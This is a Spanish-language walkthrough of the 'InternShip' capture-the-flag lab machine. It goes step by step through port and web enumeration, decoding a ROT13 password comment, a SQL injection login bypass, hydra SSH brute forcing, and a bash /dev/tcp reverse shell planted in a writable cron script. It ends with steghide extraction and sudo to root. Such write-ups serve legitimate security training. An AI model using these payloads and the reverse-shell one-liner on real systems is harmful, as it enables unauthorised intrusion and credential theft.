- Tags: #InternShip
---
[Maquina InternShip](https://mega.nz/file/TQdAXALQ#RWvOvq8NlGImQfjhptnNfYDQlRyqEIYBjNRTK8sM5o4) -> Enlace de descarga del laboratorio.

```bash
7z x internship.zip # Descomprimimos el archivo
sudo bash auto_deploy.sh internship.tar # Desplegamos el laboratorio
```

### Fase Reconocimiento:
```bash
172.17.0.2 # direccion IP del target
ping -c 1 172.17.0.2 # Realizamos una traza ICMP para determinar para ver si tenemos conectividad con el target

wichSystem.py 172.17.0.2 # Determinamos que estamos ante una maquina linux
172.17.0.2 (ttl -> 64): Linux
```

### Fase Enumeracion Puertos:
```bash
escanerTCP.py -t 172.17.0.2 -p 1-10000 # Usamos nuestra herramienta
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts # Realizamos deteccion de puertos en el target
extractPorts allPorts # Parseamos la informacin mas relevante de la primera captura.
nmap -sC -sV -p22,80 172.17.0.2 -oN targeted # Realizamos un escaneo exhaustivo para determinar el servicio y la version que corren detras de estos puertos.
```

**( 22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0) )** -> Servicio **ssh** expuesto
**( 80/tcp open  http    Apache httpd 2.4.62 ((Debian)) )** -> Tenemos un servicio web expuesto

### Fase Enumeracion Web:
```bash
whatweb http://172.17.0.2 # Realizamos enumeracion de las tecnologias empleadas por la web
```

```bash
 # IP address by laboratories:
 172.17.0.2 gatekeeperhr.com # Aplicamos VirtualHosting para poder acceder a la web funcional
```

**( http://gatekeeperhr.com/index.html )** -> Esta es la direccion url de la web que tendremos que auditar

```bash
<!-- Quitar los permisos SSH a los pasantes, ya terminará el tiempo de pasantía --> # Revisanod el codigo fuente tenemos este comentario filtrado
```

```bash
gobuster dir -u http://gatekeeperhr.com/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash # Aplicamos descubrimiento de rutas:

/spam/                (Status: 200) [Size: 308] # Tenemos este recurso Modificado a ROT13
<!-- Yn pbagenfrñn qr hab qr ybf cnfnagrf rf 'checy3' --> # 

echo "checy3" | tr 'A-Za-z' 'N-ZA-Mn-za-m'  # Resultado: purple3
La contraseña de usuario es 'purpl3' # Tenemos un contrasena para algun usuario 
```

**( http://gatekeeperhr.com/contact.html )** -> En esta seccion tenemos un potencial usuario: ( mariana@gatekeeperhr.com )

```bash
mariana' or 1=1-- - # Para el panel de inicio de sesion ingresamos esta inyeccion logrando accceder
```

```bash
# Del la web sacamos los usuarios para almacenarlos en users.txt
hydra -L users.txt -p purpl3 ssh://172.17.0.2 -t 64

[22][ssh] host: 172.17.0.2   login: pedro   password: purpl3 # Tenemos este usuario valido que usaremos para conectarnos por ssh
```

### Fase Intrusion:
```bash
ssh-keygen -R 172.17.0.2 && ssh pedro@172.17.0.2 # Nos logueamos
```

### Fase Escalada Privilegios:
```bash
find / -type f -iname "*.sh" 2>/dev/null | xargs ls -l # Buscamos por achivos ssh
-rwxrw-rw- 1 valentina valentina     30 Feb  9 01:47 /opt/log_cleaner.sh # Encontrando este archivo. y Tenemos capacidad de lectura.
```

**Nota** -> **( ps -faux )** Listando los procesos del sistema encontramos: Al parecer tenemos una tarea cron ejecutada con privilegios
```bash
root          50  0.0  0.0   3600  1840 ?        Ss   20:08   0:00 /usr/sbin/cron
root        6728  0.0  0.0   5980  3088 ?        S    22:23   0:00  \_ /usr/sbin/CRON
valenti+    6732  0.0  0.0   2576  1324 ?        Ss   22:23   0:00  |   \_ /bin/sh -c sleep 45; /opt/log_cleaner.sh
```

Modificaremos ese archivo para enviarnos una bash aplicando una **reverseShell**
```bash
nc -nlvp 443 # Nos ponemos en escucha, Y obtenemos una shell como este usaurio.
bash -c 'exec bash -c &>/dev/tcp/192.168.100.24/443 <&1' # 
```

```bash
cp ~/profile_picture.jpeg /tmp # Tenemos esta imagean que nos traeremos a nuestra maquina de atacante.
chmod 777 profile_picture.jpeg # Otorgamos permisos para poder descargarla
scp pedro@172.17.0.2:/tmp/profile_picture.jpeg . # colocamos las credenciales de pedro: ( purpl3 ) y Tendremos descargada la imagen
```

```bash
steghide info profile_picture.jpeg # Aplicamos estenografia para detectar si oculta algun archivo.
steghide extract -sf profile_picture.jpeg # Extraemos el contenido oculto
cat secret.txt # Vemos que este archivo contiene esta string: ( mag1ck ) Posiblemente sea las password de el usuario valentina
```

```bash
sudo su # Proporcionamos la password: ( mag1ck ) obteniendo una shell como root.  
```